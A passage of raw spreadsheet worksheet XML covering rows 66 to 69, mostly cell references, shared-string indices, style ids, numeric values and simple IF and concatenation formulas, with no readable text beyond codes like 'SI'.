      </c>
      <c r="GA66" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB66" s="378">
        <v>0</v>
      </c>
      <c r="GC66" s="379" t="s">
        <v>12</v>
      </c>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c r="IW66" s="40"/>
      <c r="IX66" s="40"/>
      <c r="IY66" s="40"/>
      <c r="IZ66" s="40"/>
      <c r="JA66" s="40"/>
      <c r="JB66" s="40"/>
      <c r="JC66" s="40"/>
      <c r="JD66" s="40"/>
      <c r="JE66" s="40"/>
      <c r="JF66" s="40"/>
      <c r="JG66" s="40"/>
      <c r="JH66" s="40"/>
      <c r="JI66" s="40"/>
      <c r="JJ66" s="40"/>
      <c r="JK66" s="40"/>
      <c r="JL66" s="40"/>
      <c r="JM66" s="40"/>
      <c r="JN66" s="40"/>
      <c r="JO66" s="40"/>
      <c r="JP66" s="40"/>
      <c r="JQ66" s="40"/>
      <c r="JR66" s="40"/>
      <c r="JS66" s="40"/>
      <c r="JT66" s="40"/>
      <c r="JU66" s="40"/>
      <c r="JV66" s="40"/>
      <c r="JW66" s="40"/>
      <c r="JX66" s="40"/>
      <c r="JY66" s="40"/>
      <c r="JZ66" s="40"/>
      <c r="KA66" s="40"/>
      <c r="KB66" s="40"/>
      <c r="KC66" s="40"/>
      <c r="KD66" s="40"/>
      <c r="KE66" s="40"/>
      <c r="KF66" s="40"/>
      <c r="KG66" s="40"/>
      <c r="KH66" s="40"/>
      <c r="KI66" s="40"/>
      <c r="KJ66" s="40"/>
      <c r="KK66" s="40"/>
      <c r="KL66" s="40"/>
      <c r="KM66" s="40"/>
      <c r="KN66" s="40"/>
      <c r="KO66" s="40"/>
      <c r="KP66" s="40"/>
      <c r="KQ66" s="40"/>
      <c r="KR66" s="40"/>
      <c r="KS66" s="40"/>
      <c r="KT66" s="40"/>
      <c r="KU66" s="40"/>
      <c r="KV66" s="40"/>
      <c r="KW66" s="40"/>
      <c r="KX66" s="40"/>
      <c r="KY66" s="40"/>
      <c r="KZ66" s="40"/>
      <c r="LA66" s="40"/>
      <c r="LB66" s="40"/>
      <c r="LC66" s="40"/>
      <c r="LD66" s="40"/>
      <c r="LE66" s="40"/>
      <c r="LF66" s="40"/>
      <c r="LG66" s="40"/>
      <c r="LH66" s="40"/>
      <c r="LI66" s="40"/>
    </row>
    <row r="67" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B67" s="224" t="s">
        <v>591</v>
      </c>
      <c r="C67" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D67" s="225" t="s">
        <v>592</v>
      </c>
      <c r="E67" s="225" t="s">
        <v>1174</v>
      </c>
      <c r="F67" s="225">
        <v>40</v>
      </c>
      <c r="G67" s="225" t="s">
        <v>1175</v>
      </c>
      <c r="H67" s="226" t="s">
        <v>1176</v>
      </c>
      <c r="I67" s="225"/>
      <c r="J67" s="225" t="s">
        <v>1177</v>
      </c>
      <c r="K67" s="227" t="s">
        <v>1178</v>
      </c>
      <c r="L67" s="228" t="s">
        <v>203</v>
      </c>
      <c r="M67" s="227" t="s">
        <v>1179</v>
      </c>
      <c r="N67" s="227" t="s">
        <v>1180</v>
      </c>
      <c r="O67" s="389" t="s">
        <v>2712</v>
      </c>
      <c r="P67" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q67" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R67" s="225"/>
      <c r="S67" s="396"/>
      <c r="T67" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U67" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V67" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W67" s="231"/>
      <c r="X67" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y67" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z67" s="256" t="s">
        <v>1181</v>
      </c>
      <c r="AA67" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB67" s="256" t="s">
        <v>2470</v>
      </c>
      <c r="AC67" s="226" t="s">
        <v>1182</v>
      </c>
      <c r="AD67" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE67" s="259" t="s">
        <v>1185</v>
      </c>
      <c r="AF67" s="270" t="s">
        <v>1183</v>
      </c>
      <c r="AG67" s="225" t="s">
        <v>1184</v>
      </c>
      <c r="AH67" s="271" t="s">
        <v>12</v>
      </c>
      <c r="AI67" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ67" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK67" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL67" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM67" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN67" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO67" s="290" t="s">
        <v>13</v>
      </c>
      <c r="AP67" s="230"/>
      <c r="AQ67" s="230"/>
      <c r="AR67" s="288">
        <v>2</v>
      </c>
      <c r="AS67" s="288">
        <v>1</v>
      </c>
      <c r="AT67" s="288">
        <v>0</v>
      </c>
      <c r="AU67" s="288">
        <f t="shared" si="5"/>
        <v>1</v>
      </c>
      <c r="AV67" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW67" s="288">
        <v>1</v>
      </c>
      <c r="AX67" s="288">
        <v>1</v>
      </c>
      <c r="AY67" s="288">
        <v>0</v>
      </c>
      <c r="AZ67" s="288">
        <f t="shared" si="21"/>
        <v>1</v>
      </c>
      <c r="BA67" s="289"/>
      <c r="BB67" s="301">
        <v>0</v>
      </c>
      <c r="BC67" s="302">
        <v>0</v>
      </c>
      <c r="BD67" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE67" s="302">
        <v>0</v>
      </c>
      <c r="BF67" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG67" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH67" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI67" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ67" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK67" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL67" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM67" s="302">
        <v>0</v>
      </c>
      <c r="BN67" s="304">
        <v>2</v>
      </c>
      <c r="BO67" s="304">
        <v>0</v>
      </c>
      <c r="BP67" s="304">
        <v>0</v>
      </c>
      <c r="BQ67" s="304">
        <v>0</v>
      </c>
      <c r="BR67" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS67" s="304">
        <v>0</v>
      </c>
      <c r="BT67" s="304">
        <v>0</v>
      </c>
      <c r="BU67" s="304">
        <v>0</v>
      </c>
      <c r="BV67" s="305">
        <v>0</v>
      </c>
      <c r="BW67" s="317">
        <v>0</v>
      </c>
      <c r="BX67" s="318">
        <v>0</v>
      </c>
      <c r="BY67" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ67" s="318">
        <v>0</v>
      </c>
      <c r="CA67" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB67" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC67" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD67" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE67" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF67" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG67" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH67" s="318">
        <v>0</v>
      </c>
      <c r="CI67" s="319">
        <v>2</v>
      </c>
      <c r="CJ67" s="319">
        <v>0</v>
      </c>
      <c r="CK67" s="319">
        <v>0</v>
      </c>
      <c r="CL67" s="319">
        <v>0</v>
      </c>
      <c r="CM67" s="319">
        <f t="shared" si="9"/>
        <v>0</v>
      </c>
      <c r="CN67" s="319">
        <v>0</v>
      </c>
      <c r="CO67" s="319">
        <v>0</v>
      </c>
      <c r="CP67" s="319">
        <v>0</v>
      </c>
      <c r="CQ67" s="319">
        <v>0</v>
      </c>
      <c r="CR67" s="319">
        <v>0</v>
      </c>
      <c r="CS67" s="320">
        <v>0</v>
      </c>
      <c r="CT67" s="339">
        <v>0</v>
      </c>
      <c r="CU67" s="340">
        <v>0</v>
      </c>
      <c r="CV67" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW67" s="340">
        <v>0</v>
      </c>
      <c r="CX67" s="340"/>
      <c r="CY67" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ67" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA67" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB67" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC67" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD67" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE67" s="340">
        <v>0</v>
      </c>
      <c r="DF67" s="341">
        <v>2</v>
      </c>
      <c r="DG67" s="341">
        <v>0</v>
      </c>
      <c r="DH67" s="341">
        <v>0</v>
      </c>
      <c r="DI67" s="341">
        <v>0</v>
      </c>
      <c r="DJ67" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK67" s="341">
        <v>0</v>
      </c>
      <c r="DL67" s="341">
        <v>0</v>
      </c>
      <c r="DM67" s="341">
        <v>0</v>
      </c>
      <c r="DN67" s="341">
        <v>0</v>
      </c>
      <c r="DO67" s="341">
        <v>0</v>
      </c>
      <c r="DP67" s="342">
        <v>0</v>
      </c>
      <c r="DQ67" s="355">
        <v>4</v>
      </c>
      <c r="DR67" s="356">
        <v>0</v>
      </c>
      <c r="DS67" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DT67" s="356">
        <v>2</v>
      </c>
      <c r="DU67" s="356"/>
      <c r="DV67" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DW67" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX67" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DY67" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ67" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA67" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB67" s="356">
        <v>0</v>
      </c>
      <c r="EC67" s="357">
        <v>2</v>
      </c>
      <c r="ED67" s="357">
        <v>2</v>
      </c>
      <c r="EE67" s="357">
        <v>0</v>
      </c>
      <c r="EF67" s="357">
        <v>0</v>
      </c>
      <c r="EG67" s="357">
        <f t="shared" si="13"/>
        <v>0</v>
      </c>
      <c r="EH67" s="357">
        <v>3</v>
      </c>
      <c r="EI67" s="357">
        <v>0</v>
      </c>
      <c r="EJ67" s="357">
        <v>0</v>
      </c>
      <c r="EK67" s="357">
        <v>4</v>
      </c>
      <c r="EL67" s="357">
        <v>4</v>
      </c>
      <c r="EM67" s="358">
        <v>0</v>
      </c>
      <c r="EN67" s="368" t="str">
        <f t="shared" ref="EN67:EN98" si="22">IF(U67="L3","SI","NO")</f>
        <v>SI</v>
      </c>
      <c r="EO67" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP67" s="369"/>
      <c r="EQ67" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER67" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES67" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET67" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU67" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV67" s="369"/>
      <c r="EW67" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX67" s="369"/>
      <c r="EY67" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ67" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA67" s="369"/>
      <c r="FB67" s="369"/>
      <c r="FC67" s="369">
        <v>2</v>
      </c>
      <c r="FD67" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE67" s="369">
        <v>0</v>
      </c>
      <c r="FF67" s="369">
        <v>0</v>
      </c>
      <c r="FG67" s="369">
        <v>0</v>
      </c>
      <c r="FH67" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI67" s="377" t="str">
        <f t="shared" ref="FI67:FI98" si="23">IF(U67="L3","SI","NO")</f>
        <v>SI</v>
      </c>
      <c r="FJ67" s="378">
        <v>2</v>
      </c>
      <c r="FK67" s="378"/>
      <c r="FL67" s="378" t="s">
        <v>1186</v>
      </c>
      <c r="FM67" s="378">
        <v>2</v>
      </c>
      <c r="FN67" s="378"/>
      <c r="FO67" s="378" t="s">
        <v>1186</v>
      </c>
      <c r="FP67" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ67" s="378"/>
      <c r="FR67" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS67" s="380"/>
      <c r="FT67" s="380"/>
      <c r="FU67" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV67" s="378"/>
      <c r="FW67" s="378"/>
      <c r="FX67" s="378">
        <v>2</v>
      </c>
      <c r="FY67" s="378">
        <f t="shared" si="20"/>
        <v>0</v>
      </c>
      <c r="FZ67" s="378">
        <v>0</v>
      </c>
      <c r="GA67" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB67" s="378">
        <v>0</v>
      </c>
      <c r="GC67" s="379" t="s">
        <v>12</v>
      </c>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IY67" s="40"/>
      <c r="IZ67" s="40"/>
      <c r="JA67" s="40"/>
      <c r="JB67" s="40"/>
      <c r="JC67" s="40"/>
      <c r="JD67" s="40"/>
      <c r="JE67" s="40"/>
      <c r="JF67" s="40"/>
      <c r="JG67" s="40"/>
      <c r="JH67" s="40"/>
      <c r="JI67" s="40"/>
      <c r="JJ67" s="40"/>
      <c r="JK67" s="40"/>
      <c r="JL67" s="40"/>
      <c r="JM67" s="40"/>
      <c r="JN67" s="40"/>
      <c r="JO67" s="40"/>
      <c r="JP67" s="40"/>
      <c r="JQ67" s="40"/>
      <c r="JR67" s="40"/>
      <c r="JS67" s="40"/>
      <c r="JT67" s="40"/>
      <c r="JU67" s="40"/>
      <c r="JV67" s="40"/>
      <c r="JW67" s="40"/>
      <c r="JX67" s="40"/>
      <c r="JY67" s="40"/>
      <c r="JZ67" s="40"/>
      <c r="KA67" s="40"/>
      <c r="KB67" s="40"/>
      <c r="KC67" s="40"/>
      <c r="KD67" s="40"/>
      <c r="KE67" s="40"/>
      <c r="KF67" s="40"/>
      <c r="KG67" s="40"/>
      <c r="KH67" s="40"/>
      <c r="KI67" s="40"/>
      <c r="KJ67" s="40"/>
      <c r="KK67" s="40"/>
      <c r="KL67" s="40"/>
      <c r="KM67" s="40"/>
      <c r="KN67" s="40"/>
      <c r="KO67" s="40"/>
      <c r="KP67" s="40"/>
      <c r="KQ67" s="40"/>
      <c r="KR67" s="40"/>
      <c r="KS67" s="40"/>
      <c r="KT67" s="40"/>
      <c r="KU67" s="40"/>
      <c r="KV67" s="40"/>
      <c r="KW67" s="40"/>
      <c r="KX67" s="40"/>
      <c r="KY67" s="40"/>
      <c r="KZ67" s="40"/>
      <c r="LA67" s="40"/>
      <c r="LB67" s="40"/>
      <c r="LC67" s="40"/>
      <c r="LD67" s="40"/>
      <c r="LE67" s="40"/>
      <c r="LF67" s="40"/>
      <c r="LG67" s="40"/>
      <c r="LH67" s="40"/>
      <c r="LI67" s="40"/>
    </row>
    <row r="68" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B68" s="224" t="s">
        <v>176</v>
      </c>
      <c r="C68" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D68" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E68" s="225" t="s">
        <v>1187</v>
      </c>
      <c r="F68" s="225">
        <v>41</v>
      </c>
      <c r="G68" s="225" t="s">
        <v>1188</v>
      </c>
      <c r="H68" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I68" s="225"/>
      <c r="J68" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K68" s="227" t="s">
        <v>1189</v>
      </c>
      <c r="L68" s="228" t="s">
        <v>1192</v>
      </c>
      <c r="M68" s="227" t="s">
        <v>1190</v>
      </c>
      <c r="N68" s="227" t="s">
        <v>1191</v>
      </c>
      <c r="O68" s="389" t="s">
        <v>2713</v>
      </c>
      <c r="P68" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q68" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R68" s="225"/>
      <c r="S68" s="396"/>
      <c r="T68" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U68" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V68" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W68" s="231"/>
      <c r="X68" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y68" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z68" s="256" t="s">
        <v>2471</v>
      </c>
      <c r="AA68" s="257" t="s">
        <v>2420</v>
      </c>
      <c r="AB68" s="256" t="s">
        <v>2472</v>
      </c>
      <c r="AC68" s="226" t="s">
        <v>1193</v>
      </c>
      <c r="AD68" s="258" t="s">
        <v>269</v>
      </c>
      <c r="AE68" s="259" t="s">
        <v>1197</v>
      </c>
      <c r="AF68" s="275" t="s">
        <v>1194</v>
      </c>
      <c r="AG68" s="225" t="s">
        <v>1195</v>
      </c>
      <c r="AH68" s="273" t="s">
        <v>1196</v>
      </c>
      <c r="AI68" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ68" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK68" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL68" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM68" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN68" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO68" s="290" t="s">
        <v>13</v>
      </c>
      <c r="AP68" s="230"/>
      <c r="AQ68" s="230"/>
      <c r="AR68" s="288">
        <v>2</v>
      </c>
      <c r="AS68" s="288">
        <v>1</v>
      </c>
      <c r="AT68" s="288">
        <v>0</v>
      </c>
      <c r="AU68" s="288">
        <f t="shared" ref="AU68:AU131" si="24">AS68+AT68</f>
        <v>1</v>
      </c>
      <c r="AV68" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW68" s="288">
        <v>1</v>
      </c>
      <c r="AX68" s="288">
        <v>1</v>
      </c>
      <c r="AY68" s="288">
        <v>0</v>
      </c>
      <c r="AZ68" s="288">
        <f t="shared" si="21"/>
        <v>1</v>
      </c>
      <c r="BA68" s="289"/>
      <c r="BB68" s="301">
        <v>0</v>
      </c>
      <c r="BC68" s="302">
        <v>0</v>
      </c>
      <c r="BD68" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE68" s="302">
        <v>0</v>
      </c>
      <c r="BF68" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG68" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH68" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI68" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ68" s="302" t="str">
        <f t="shared" ref="BJ68:BJ131" si="25">BK68 &amp; ", " &amp; BL68</f>
        <v>-, -</v>
      </c>
      <c r="BK68" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL68" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM68" s="302">
        <v>0</v>
      </c>
      <c r="BN68" s="304">
        <v>2</v>
      </c>
      <c r="BO68" s="304">
        <v>0</v>
      </c>
      <c r="BP68" s="304">
        <v>0</v>
      </c>
      <c r="BQ68" s="304">
        <v>0</v>
      </c>
      <c r="BR68" s="304">
        <f t="shared" ref="BR68:BR131" si="26">BP68+BQ68</f>
        <v>0</v>
      </c>
      <c r="BS68" s="304">
        <v>0</v>
      </c>
      <c r="BT68" s="304">
        <v>0</v>
      </c>
      <c r="BU68" s="304">
        <v>0</v>
      </c>
      <c r="BV68" s="305">
        <v>0</v>
      </c>
      <c r="BW68" s="317">
        <v>0</v>
      </c>
      <c r="BX68" s="318">
        <v>0</v>
      </c>
      <c r="BY68" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ68" s="318">
        <v>0</v>
      </c>
      <c r="CA68" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB68" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC68" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD68" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE68" s="318" t="str">
        <f t="shared" ref="CE68:CE131" si="27">CF68 &amp; ", " &amp; CG68</f>
        <v>-, -</v>
      </c>
      <c r="CF68" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG68" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH68" s="318">
        <v>0</v>
      </c>
      <c r="CI68" s="319">
        <v>2</v>
      </c>
      <c r="CJ68" s="319">
        <v>0</v>
      </c>
      <c r="CK68" s="319">
        <v>0</v>
      </c>
      <c r="CL68" s="319">
        <v>0</v>
      </c>
      <c r="CM68" s="319">
        <f t="shared" ref="CM68:CM131" si="28">CK68+CL68</f>
        <v>0</v>
      </c>
      <c r="CN68" s="319">
        <v>0</v>
      </c>
      <c r="CO68" s="319">
        <v>0</v>
      </c>
      <c r="CP68" s="319">
        <v>0</v>
      </c>
      <c r="CQ68" s="319">
        <v>0</v>
      </c>
      <c r="CR68" s="319">
        <v>0</v>
      </c>
      <c r="CS68" s="320">
        <v>0</v>
      </c>
      <c r="CT68" s="339">
        <v>0</v>
      </c>
      <c r="CU68" s="340">
        <v>0</v>
      </c>
      <c r="CV68" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW68" s="340">
        <v>0</v>
      </c>
      <c r="CX68" s="340"/>
      <c r="CY68" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ68" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA68" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB68" s="340" t="str">
        <f t="shared" ref="DB68:DB131" si="29">DC68 &amp; ", " &amp; DD68</f>
        <v>-, -</v>
      </c>
      <c r="DC68" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD68" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE68" s="340">
        <v>0</v>
      </c>
      <c r="DF68" s="341">
        <v>2</v>
      </c>
      <c r="DG68" s="341">
        <v>0</v>
      </c>
      <c r="DH68" s="341">
        <v>0</v>
      </c>
      <c r="DI68" s="341">
        <v>0</v>
      </c>
      <c r="DJ68" s="341">
        <f t="shared" ref="DJ68:DJ131" si="30">DH68+DI68</f>
        <v>0</v>
      </c>
      <c r="DK68" s="341">
        <v>0</v>
      </c>
      <c r="DL68" s="341">
        <v>0</v>
      </c>
      <c r="DM68" s="341">
        <v>0</v>
      </c>
      <c r="DN68" s="341">
        <v>0</v>
      </c>
      <c r="DO68" s="341">
        <v>0</v>
      </c>
      <c r="DP68" s="342">
        <v>0</v>
      </c>
      <c r="DQ68" s="355">
        <v>2</v>
      </c>
      <c r="DR68" s="356">
        <v>0</v>
      </c>
      <c r="DS68" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DT68" s="356">
        <v>2</v>
      </c>
      <c r="DU68" s="356"/>
      <c r="DV68" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DW68" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX68" s="356" t="s">
        <v>196</v>
      </c>
      <c r="DY68" s="356" t="str">
        <f t="shared" ref="DY68:DY131" si="31">DZ68 &amp; ", " &amp; EA68</f>
        <v>-, -</v>
      </c>
      <c r="DZ68" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA68" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB68" s="356">
        <v>0</v>
      </c>
      <c r="EC68" s="357">
        <v>2</v>
      </c>
      <c r="ED68" s="357">
        <v>1</v>
      </c>
      <c r="EE68" s="357">
        <v>0</v>
      </c>
      <c r="EF68" s="357">
        <v>0</v>
      </c>
      <c r="EG68" s="357">
        <f t="shared" ref="EG68:EG131" si="32">EE68+EF68</f>
        <v>0</v>
      </c>
      <c r="EH68" s="357">
        <v>1</v>
      </c>
      <c r="EI68" s="357">
        <v>0</v>
      </c>
      <c r="EJ68" s="357">
        <v>0</v>
      </c>
      <c r="EK68" s="357">
        <v>2</v>
      </c>
      <c r="EL68" s="357">
        <v>2</v>
      </c>
      <c r="EM68" s="358">
        <v>0</v>
      </c>
      <c r="EN68" s="368" t="str">
        <f t="shared" si="22"/>
        <v>SI</v>
      </c>
      <c r="EO68" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP68" s="369"/>
      <c r="EQ68" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER68" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES68" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET68" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU68" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV68" s="369"/>
      <c r="EW68" s="369">
        <v>15921</v>
      </c>
      <c r="EX68" s="369"/>
      <c r="EY68" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ68" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA68" s="369"/>
      <c r="FB68" s="369"/>
      <c r="FC68" s="369">
        <v>1</v>
      </c>
      <c r="FD68" s="369">
        <f t="shared" si="15"/>
        <v>1</v>
      </c>
      <c r="FE68" s="369">
        <v>0</v>
      </c>
      <c r="FF68" s="369">
        <v>1</v>
      </c>
      <c r="FG68" s="369">
        <v>1</v>
      </c>
      <c r="FH68" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI68" s="377" t="str">
        <f t="shared" si="23"/>
        <v>SI</v>
      </c>
      <c r="FJ68" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK68" s="378"/>
      <c r="FL68" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM68" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN68" s="378"/>
      <c r="FO68" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP68" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ68" s="378"/>
      <c r="FR68" s="380" t="s">
        <v>1198</v>
      </c>
      <c r="FS68" s="380"/>
      <c r="FT68" s="380"/>
      <c r="FU68" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV68" s="378"/>
      <c r="FW68" s="378"/>
      <c r="FX68" s="378">
        <v>1</v>
      </c>
      <c r="FY68" s="378">
        <f t="shared" si="20"/>
        <v>1</v>
      </c>
      <c r="FZ68" s="378">
        <v>0</v>
      </c>
      <c r="GA68" s="378" t="s">
        <v>391</v>
      </c>
      <c r="GB68" s="378">
        <v>1</v>
      </c>
      <c r="GC68" s="379" t="s">
        <v>12</v>
      </c>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IY68" s="40"/>
      <c r="IZ68" s="40"/>
      <c r="JA68" s="40"/>
      <c r="JB68" s="40"/>
      <c r="JC68" s="40"/>
      <c r="JD68" s="40"/>
      <c r="JE68" s="40"/>
      <c r="JF68" s="40"/>
      <c r="JG68" s="40"/>
      <c r="JH68" s="40"/>
      <c r="JI68" s="40"/>
      <c r="JJ68" s="40"/>
      <c r="JK68" s="40"/>
      <c r="JL68" s="40"/>
      <c r="JM68" s="40"/>
      <c r="JN68" s="40"/>
      <c r="JO68" s="40"/>
      <c r="JP68" s="40"/>
      <c r="JQ68" s="40"/>
      <c r="JR68" s="40"/>
      <c r="JS68" s="40"/>
      <c r="JT68" s="40"/>
      <c r="JU68" s="40"/>
      <c r="JV68" s="40"/>
      <c r="JW68" s="40"/>
      <c r="JX68" s="40"/>
      <c r="JY68" s="40"/>
      <c r="JZ68" s="40"/>
      <c r="KA68" s="40"/>
      <c r="KB68" s="40"/>
      <c r="KC68" s="40"/>
      <c r="KD68" s="40"/>
      <c r="KE68" s="40"/>
      <c r="KF68" s="40"/>
      <c r="KG68" s="40"/>
      <c r="KH68" s="40"/>
      <c r="KI68" s="40"/>
      <c r="KJ68" s="40"/>
      <c r="KK68" s="40"/>
      <c r="KL68" s="40"/>
      <c r="KM68" s="40"/>
      <c r="KN68" s="40"/>
      <c r="KO68" s="40"/>
      <c r="KP68" s="40"/>
      <c r="KQ68" s="40"/>
      <c r="KR68" s="40"/>
      <c r="KS68" s="40"/>
      <c r="KT68" s="40"/>
      <c r="KU68" s="40"/>
      <c r="KV68" s="40"/>
      <c r="KW68" s="40"/>
      <c r="KX68" s="40"/>
      <c r="KY68" s="40"/>
      <c r="KZ68" s="40"/>
      <c r="LA68" s="40"/>
      <c r="LB68" s="40"/>
      <c r="LC68" s="40"/>
      <c r="LD68" s="40"/>
      <c r="LE68" s="40"/>
      <c r="LF68" s="40"/>
      <c r="LG68" s="40"/>
      <c r="LH68" s="40"/>
      <c r="LI68" s="40"/>
    </row>
    <row r="69" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B69" s="224" t="s">
        <v>176</v>
      </c>
      <c r="C69" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D69" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E69" s="225" t="s">
        <v>1187</v>
      </c>
      <c r="F69" s="225">
        <v>41</v>
      </c>
      <c r="G69" s="225" t="s">
        <v>1188</v>
      </c>
      <c r="H69" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I69" s="225"/>
      <c r="J69" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K69" s="227" t="s">
        <v>1189</v>
      </c>
      <c r="L69" s="228" t="s">
        <v>280</v>
      </c>
      <c r="M69" s="227" t="s">
        <v>1190</v>
      </c>
      <c r="N69" s="227" t="s">
        <v>1199</v>
      </c>
      <c r="O69" s="389" t="s">
        <v>2714</v>
      </c>
      <c r="P69" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q69" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R69" s="225"/>
